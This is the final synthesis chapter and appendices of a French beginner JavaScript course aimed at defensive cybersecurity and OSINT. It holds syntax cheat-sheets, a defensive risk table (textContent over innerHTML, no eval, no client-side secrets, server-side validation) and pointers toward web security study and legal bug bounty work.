Tu disposes maintenant d'un socle JavaScript **orienté défense** : comprendre le web, lire du JS, manipuler des données, scripter avec Node.js, et raisonner sécurité côté client. La suite logique est la sécurité web approfondie.


-----

# Synthèse finale & cheat-sheets

## Ce que tu as construit

Tu es parti de zéro et tu disposes maintenant d'un socle JavaScript **orienté IT / cyber / OSINT** :

```text
Console navigateur + fichiers
→ langage de base (variables, conditions, boucles)
→ données et code (fonctions, chaînes, URL, regex, tableaux, objets, JSON, erreurs)
→ DOM et événements (en sécurité)
→ stockage navigateur (et ses pièges)
→ HTTP / async / fetch / CORS
→ Node.js (fichiers, CLI, modules, npm)
→ sécurité web côté client (XSS, CSP, client non fiable, lecture de code)
```

## Les 10 principes à retenir

1. **« Où tourne mon code ? »** Navigateur (DOM, pas de fichiers) ou Node.js (fichiers, pas de DOM). Toujours se poser la question.
2. **`const` par défaut, `let` si ça change, jamais `var`.**
3. **Toujours `===`, jamais `==`.** Comparaison honnête, pas de conversion surprise.
4. **Les chaînes sont immuables** : récupère le résultat (`x = x.trim()`).
5. **`filter`/`map`/`find` + tableaux d'objets** = le geste central du traitement de données.
6. **`JSON.parse` pour lire, `JSON.stringify` pour écrire** ; toujours dans un `try/catch`, jamais d'`eval`.
7. **`textContent`, pas `innerHTML`** pour une donnée externe. C'est la défense n° 1 du XSS.
8. **Jamais de secret côté client** (ni LocalStorage, ni JS). Les secrets restent au serveur.
9. **La validation client = confort ; la sécurité = serveur.** Le client n'est jamais de confiance.
10. **Gère toujours l'échec** (réseau, fichier, parsing) avec `try/catch` ou `.catch`.

-----

## Cheat-sheet — Syntaxe de base

```javascript
// Variables
const x = 10;          // constante
let y = "texte";       // variable

// Types
typeof valeur;         // "string" | "number" | "boolean" | "undefined" | "object"

// Template string
`Valeur : ${x}`;

// Comparaison (toujours stricte)
a === b;   a !== b;   a > b;   a >= b;

// Logique
a && b;    a || b;    !a;

// Condition
if (cond) { } else if (cond2) { } else { }
const r = cond ? "oui" : "non";          // ternaire

// Boucles
for (let i = 0; i < n; i++) { }
for (const el of tableau) { }
while (cond) { }
```

## Cheat-sheet — Chaînes

```javascript
s.length;                 s[0];
s.trim();                 s.toLowerCase();   s.toUpperCase();
s.includes("x");          s.startsWith("x"); s.endsWith("x");
s.indexOf("x");           s.replace("a","b"); s.slice(0, 5);
s.split(",");             ["a","b"].join("-");

// URL
const u = new URL("https://h.test:8443/p?q=1");
u.hostname; u.pathname; u.searchParams.get("q");

// Regex (extraction d'IOC)
texte.match(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/g) || [];
/motif/.test(texte);
```

## Cheat-sheet — Tableaux et objets

```javascript
// Tableaux
arr.push(x);   arr.pop();   arr.length;   arr.includes(x);
arr.filter(el => cond);     // sous-ensemble (tableau)
arr.map(el => transforme);  // transformation (tableau)
arr.find(el => cond);       // premier élément (ou undefined)
[...new Set(arr)];          // dédoublonner

// Objets
const o = { ip: "8.8.8.8", code: 403 };
o.ip;   o["ip"];   o.nouvelle = 1;   delete o.code;
Object.keys(o); Object.values(o); Object.entries(o);
const { ip, code } = o;     // déstructuration
o.peutEtreAbsent?.x;        // accès optionnel

// JSON
const obj = JSON.parse(texte);                 // lire
const txt = JSON.stringify(obj, null, 2);      // écrire (indenté)
```

## Cheat-sheet — DOM (navigateur)

```javascript
const el  = document.querySelector("#id");      // premier
const els = document.querySelectorAll(".cls");  // tous

el.textContent = "sûr";        // ✅ affichage de données
el.innerHTML = "<b>contrôlé</b>"; // ⚠️ jamais avec une donnée externe
el.classList.add("x"); el.classList.toggle("y");
el.setAttribute("data-ip", "8.8.8.8");

const n = document.createElement("li");
n.textContent = valeur; parent.appendChild(n);   // insertion sûre

// Événements
el.addEventListener("click", () => { });
form.addEventListener("submit", (e) => { e.preventDefault(); });
champ.value;   // contenu d'un input
```

## Cheat-sheet — fetch / async

```javascript
// async / await (recommandé)
async function go() {
  try {
    const r = await fetch(url);
    if (!r.ok) throw new Error(`HTTP ${r.status}`);
    const data = await r.json();
    return data;
  } catch (e) {
    console.log("Erreur :", e.message);
  }
}

// Promesses (.then)
fetch(url)
  .then(r => r.json())
  .then(data => { })
  .catch(err => { });
```

## Cheat-sheet — Node.js

```javascript
// Fichiers
const fs = require("fs");
const txt = fs.readFileSync("f.txt", "utf-8");
fs.writeFileSync("out.txt", contenu, "utf-8");
fs.appendFileSync("out.txt", suite, "utf-8");

// Arguments CLI
const args = process.argv.slice(2);   // tes arguments
process.exit(1);                       // code de sortie

// Modules (CommonJS)
module.exports = { maFonction };           // dans outils.js
const { maFonction } = require("./outils"); // ailleurs

// npm
// npm init -y    npm install paquet    npm audit    npm run script
```

-----

## Cheat-sheet SÉCURITÉ — Boîte à risques (version imprimable)

> À garder sous les yeux. Chaque ligne : le risque, la règle, le chapitre.

| Risque | La règle défensive | Ch. |
| --- | --- | --- |
| `innerHTML` + donnée externe | Utilise **`textContent`** (ou `createElement` + `textContent`). | 15, 30 |
| `eval` / `new Function` | **Jamais.** `JSON.parse` pour le JSON. | 13, 30 |
| Validation seulement côté client | **Valide au serveur** ; le client est du confort. | 17, 32 |
| Token/secret en LocalStorage | **Jamais de secret côté client.** Session via cookie `HttpOnly`. | 18, 30 |
| Token exposé dans le JS | Les secrets/clés restent **au serveur**. | 18, 32 |
| Mauvais choix de stockage | Cookie (session) / Session (temporaire) / Local (préférences). | 18, 19 |
| CORS pris pour une sécurité serveur | CORS protège l'**utilisateur** ; sécurise l'API par **auth serveur**. | 24, 31 |
| Bouton masqué = contrôle d'accès | Cacher ≠ interdire ; **autorise au serveur**. | 17, 32 |
| Dépendance npm non vérifiée | `npm audit`, vérifie le nom (typosquatting), `package-lock`. | 29 |
| Copier-coller / exécuter du code inconnu | **Lis, n'exécute pas.** Analyse statique. | 29, 33 |
| Erreurs réseau non gérées | `try/catch` ou `.catch` sur **tout** `fetch`. | 22, 23 |
| JSON non validé | `JSON.parse` en `try/catch` + vérifie la structure. | 12 |
| Donnée utilisateur affichée brute | **`textContent`** systématique. | 15, 30 |
| `==` au lieu de `===` | **Toujours `===` / `!==`.** | 4 |
| `null` vs `undefined` | Teste explicitement ; comprends la différence. | 3 |
| Cookie sans `HttpOnly`/`Secure`/`SameSite` | Pose les trois sur les cookies de session (côté serveur). | 19, 31 |
| Logique sensible côté frontend | **Le client n'est jamais de confiance.** | 32 |

**La phrase à retenir :** *le frontend, c'est l'expérience ; le serveur, c'est la sécurité.*

-----

# Annexes

> Les annexes cadrent **quand et pourquoi** s'intéresser à ces sujets, sans les enseigner en détail. Ils sont **hors du cœur** de ce cours : maîtrise d'abord JS natif, DOM, fetch, JSON, Node.js et la sécurité côté client. Reviens-y ensuite, selon tes besoins.

## Annexe A — `var`, hoisting, `this`, prototypes

Les coins historiques et avancés du langage, utiles surtout pour **lire du vieux code** ou comprendre certaines bizarreries.

- **`var`** : l'ancienne déclaration de variable. Sa portée est la **fonction** (pas le bloc), ce qui crée des surprises. **À éviter à l'écriture** ; à connaître pour lire du code ancien. Préfère `const`/`let`.
- **Hoisting** : JavaScript « remonte » les déclarations en haut de leur portée. Avec `var`, une variable peut exister (valant `undefined`) avant sa ligne de déclaration. Avec `const`/`let`, l'accès avant déclaration lève une erreur (comportement plus sain).
- **`this`** : un mot-clé dont la valeur **dépend de la façon dont une fonction est appelée**. Source classique de confusion. Les fonctions fléchées ne créent pas leur propre `this` (elles héritent de l'englobant), ce qui simplifie souvent les choses. À approfondir le jour où tu écris des objets/classes complexes.
- **Prototypes** : le mécanisme d'héritage historique de JavaScript (avant la syntaxe `class`). Comprendre les prototypes éclaire le fonctionnement profond du langage, mais n'est pas nécessaire pour les usages de ce cours.

**Quand t'y intéresser :** quand tu lis du code legacy, ou quand une bizarrerie de `this`/hoisting te bloque.

## Annexe B — TypeScript

**TypeScript** est un sur-ensemble de JavaScript qui ajoute un **typage statique** : tu annotes les types (`let port: number = 443`), et un compilateur vérifie la cohérence **avant** l'exécution.

- **Pourquoi ça existe :** attraper des erreurs de type à l'écriture plutôt qu'à l'exécution, et documenter le code. Très répandu dans les projets professionnels d'envergure.
- **Pourquoi hors cœur ici :** pour comprendre le web, lire du JS, scripter en Node et raisonner sécurité, **JavaScript natif suffit**. TypeScript ajoute une couche d'outillage qui n'apporte rien aux objectifs de ce cours pour un débutant.
- **Quand t'y mettre :** quand tu rejoins un projet qui l'utilise, ou quand tes scripts grossissent au point que le typage devient un confort.

## Annexe C — Frameworks front (React, Vue, Angular, Next.js)

Les **frameworks** structurent les grandes applications web (interfaces complexes, composants réutilisables, gestion d'état).

- **React, Vue, Angular** : trois approches pour construire des interfaces riches. **Next.js** est un framework bâti sur React, ajoutant rendu serveur et routage.
- **Pourquoi hors cœur ici :** ils supposent une bonne maîtrise de JavaScript natif, du DOM et de l'asynchrone — exactement ce que ce cours construit. Apprendre un framework **avant** ces bases mène à du code qu'on copie sans comprendre.
- **Lien cyber :** côté défensif, tu rencontreras des applications en React/Vue. Savoir lire du JS et comprendre le DOM (ce cours) t'aide à les analyser, même sans maîtriser le framework. Beaucoup de failles (dont le XSS) se raisonnent au niveau JavaScript/DOM, sous le framework.
- **Quand t'y mettre :** après être à l'aise avec tout ce cours, si tu veux construire des interfaces conséquentes.

## Annexe D — Outillage moderne (Vite, bundlers)

Les projets front utilisent des outils de **build** : un **bundler** (Vite, esbuild, webpack…) regroupe et optimise les fichiers JavaScript pour la production.

- **À quoi ça sert :** rassembler de nombreux modules en quelques fichiers optimisés, gérer les dépendances, recharger à chaud pendant le développement.
- **Pourquoi hors cœur ici :** ce cours fonctionne avec un simple `index.html` + `script.js` et avec `node script.js` — aucun bundler nécessaire pour apprendre. L'outillage s'ajoute quand le projet grandit.
- **Quand t'y intéresser :** quand tu travailles sur une application avec un framework, ou quand tu vois un `vite.config` / `webpack.config` dans un projet à analyser.

## Annexe E — Express / backend

**Express** est un framework Node.js minimaliste pour écrire des **serveurs web** et des **APIs**.

- **Le lien avec la sécurité :** c'est **côté serveur** que se joue la vraie sécurité (chapitre 32). Express illustre où vivent la **validation qui fait foi**, l'**authentification**, les **autorisations**, et où l'on pose les **en-têtes de sécurité** et les **cookies `HttpOnly`** (chapitre 31).
- **Pourquoi hors cœur ici :** ce cours est orienté **JavaScript côté client + scripting Node**. Le développement backend complet est un sujet à part entière.
- **Quand t'y mettre :** quand tu veux comprendre l'autre moitié du web (le serveur), ou construire toi-même une petite API. Comprendre le backend renforce énormément le réflexe « le client n'est jamais de confiance ».

## Annexe F — Pont vers la suite cyber

Ce cours est une **brique** d'un parcours plus large. Voici où il mène, en cohérence avec la collection (`Bash / Python → JavaScript → Web Security → Docker / Kubernetes`).

- **Web Security (la suite directe).** Tu as les fondations pour aborder sérieusement la sécurité web : XSS (chapitres 15, 30), CSP et en-têtes (31), cookies et sessions (19), CORS (24), le principe du client non fiable (32), la lecture de code (33). La suite approfondit ces vulnérabilités et en ajoute (injection, CSRF, contrôle d'accès…), **toujours dans un cadre légal et défensif**.
- **Bug bounty débutant.** Avec la lecture de JavaScript (chapitre 33), l'analyse des requêtes (`fetch`, DevTools Réseau), la compréhension du DOM et des en-têtes, tu as la base pour commencer à explorer des programmes légitimes. Insiste sur le **cadre** : uniquement sur les périmètres autorisés, avec les règles du programme.
- **OSINT tooling.** Node.js (Partie 6) te permet d'écrire tes propres outils : extracteurs d'IOC, clients d'APIs de threat intel, parsers de données publiques, enrichissement en lot. Tu réutilises directement regex, `fetch`, JSON, `fs` et modules.
- **Vers le backend et l'infra.** Express (annexe E) puis la conteneurisation (cours Docker/Kubernetes de la collection) complètent la vision : du client au serveur, puis au déploiement.

**Prochaine étape recommandée :** consolide ce cours par les mini-projets, puis enchaîne sur **Web Security**, où tout ce que tu as appris côté client prend tout son sens — du point de vue de la défense.

-----

*Fin du cours. Tu sais désormais comprendre le web, lire et écrire du JavaScript, manipuler des données, automatiser avec Node.js, et raisonner sécurité côté client. La suite, c'est la pratique : reprends les mini-projets, adapte-les à tes propres données, et garde la Boîte à risques sous les yeux.*
